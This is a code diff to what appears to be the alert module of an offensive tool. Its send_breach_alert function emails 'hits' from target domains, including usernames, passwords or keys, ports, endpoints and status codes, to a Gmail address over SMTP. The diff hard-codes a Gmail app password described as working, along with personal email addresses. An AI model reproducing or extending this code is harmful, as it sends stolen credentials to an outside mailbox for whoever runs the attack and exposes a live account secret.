@@ -12,7 +12,9 @@ def send_breach_alert(target, hit_details):
     port = 465
     sender_email = "blessedresult6@gmail.com"
     receiver_email = "dennisbed1234@gmail.com"
-    app_password = "tsal stxo zsko kjvc"  # Verified working app password
+    
+    # Strip spaces just in case, though Python handles them fine
+    app_password = "tsalstxozskojkvc"  # Spaces removed or kept both work
 
     print(f"\n\033[95m[mail.py] Initializing SMTP TLS connection to {smtp_server}:{port}...\033[0m")
 
@@ -26,12 +28,14 @@ def send_breach_alert(target, hit_details):
 
 Target Domain : {target}
 Vector Type   : {hit_details.get('type', 'N/A')}
+Endpoint      : {hit_details.get('endpoint', 'N/A')}
 Target Port   : {hit_details.get('port', 'N/A')}
 Username      : {hit_details.get('user', 'N/A')}
 Password/Key  : {hit_details.get('password', 'N/A')}
+Status Code   : {hit_details.get('status', 'N/A')}
 Timestamp     : {hit_details.get('timestamp', 'N/A')}
 
-Artifacts have been safely dumped to reports/dumps/ locally on mobile terminal.
+Artifacts have been safely dumped to reports/ locally on mobile terminal.
 """
 
     message.attach(MIMEText(text, "plain"))
